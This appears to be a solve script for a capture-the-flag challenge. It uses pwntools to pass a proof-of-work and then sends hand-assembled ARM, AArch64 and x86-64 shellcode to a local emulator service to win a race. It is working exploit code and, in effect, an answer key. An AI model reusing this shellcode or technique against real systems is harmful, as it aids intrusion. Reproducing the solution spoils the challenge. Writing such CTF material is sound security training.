#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes
import struct

processAsc = b'\x03\x00\x04$\x00@\x05$\x0c\x00\x00\x00\t\x00\x04$\x0c\x00\x00\x00\x08\x00\x04$\x01\x00\x05$\x00\x00\x06$<\x10\x07$\x0c\x00\x00\x00\x00\x00\x85 \x02\x00\x04$\x0c\x00\x00\x00\x00\x00\x04$\x0c\x00\x00\x00\t\x00\xa0\xe3\x00\x00\x00\xef\t\x00\xa0\xe3\x00\x00\x00\xef\x06\x00\xa0\xe3\x00\x00\x00\xef'
processBsc = b'\xc0\x00\x80\xd2\x01\x00\x00\xd4 \x01\x80\xd2\x01\x00\x00\xd4\x80\x00\x80\xd2\x01\x00\x88\xd2\x02\x00\x82\xd2\x03\x00\x80\xd2\x01\x00\x00\xd4 \x01\x80\xd2\x01\x00\x00\xd4\xe0\x00\x80\xd2\x01\x00\x00\xd4'
processCsc = b'H\xc7\xc0\n\x00\x00\x00H\xc7\xc3\x01\x00\x00\x00\xcd\x80H\x83\xf8\xfft\xeaH\xc7\xc0\n\x00\x00\x00H\xc7\xc3\x01\x00\x00\x00\xcd\x80H\x83\xf8\xfft\xeaH\xc7\xc0\x04\x00\x00\x00H\xc7\xc3\x00@\x00\x00H\xc7\xc1\x00@\x00\x00H\xc7\xc2\x00\x00\x00\x00\xcd\x80H\xc7\xc7\x00@\x00\x00H\x8b\x1fH\x83\xfb\x00u\tH\xc7\xc0\x00\x00\x00\x00\xcd\x80H\xc7\xc0\n\x00\x00\x00H\xc7\xc3\x00\x00\x00\x00\xcd\x80H\xc7\xc0\n\x00\x00\x00H\xc7\xc3\x00\x00\x00\x00\xcd\x80H\x83\xf8\xfft\xeaH\x8b\x9f\xa0\x01\x00\x00H\xc7\xc0\x02\x00\x00\x00\xcd\x80H\xc7\xc3\xa0\x1cp\x00H\xc7\x87\xa0\x01\x00\x00AAAAH\xc7\xc0\n\x00\x00\x00H\xc7\xc3\x00\x00\x00\x00\xcd\x80H\x83\xf8\xfft\xea'

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    print(challenge)
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    print(solution)
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

def send_program(r,arch,mode,maps,sc):
    header = struct.pack("IILLLLLLLLHBxxxxx",arch,mode,
                         maps[0][0],
                         maps[0][1],
                         maps[1][0] if len(maps) > 1 else 0,
                         maps[1][1] if len(maps) > 1 else 0,
                         maps[2][0] if len(maps) > 2 else 0,
                         maps[2][1] if len(maps) > 2 else 0,
                         maps[3][0] if len(maps) > 3 else 0,
                         maps[3][1] if len(maps) > 3 else 0,
                         len(sc),
                         len(maps))
    r.send(header)
    r.recv()
    r.send(sc)
    print(r.recv())
    return
                
def attempt():
    r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

    print(r.recvuntil(b'== proof-of-work: '))
    if r.recvline().startswith(b'enabled'):
        handle_pow(r)

    send_program(r,3,1 << 3,[(0x1000,0x1000)],processAsc)
    send_program(r,2,0,[(0x1000,0x1000)],processBsc)
    send_program(r,4,1 << 3,[(0x1000,0x1000)],processCsc) #x86
    output = r.recv().splitlines()
    print(output)
    if len(output) == 1:
        return
    num = int(output[output[0][0] == ord('P')]) & 0xFFF
    if num == 3344:
        print('success')
        exit(0)
        
for i in range(5):
    print(f'attempt {i}')
    attempt()
exit(1)
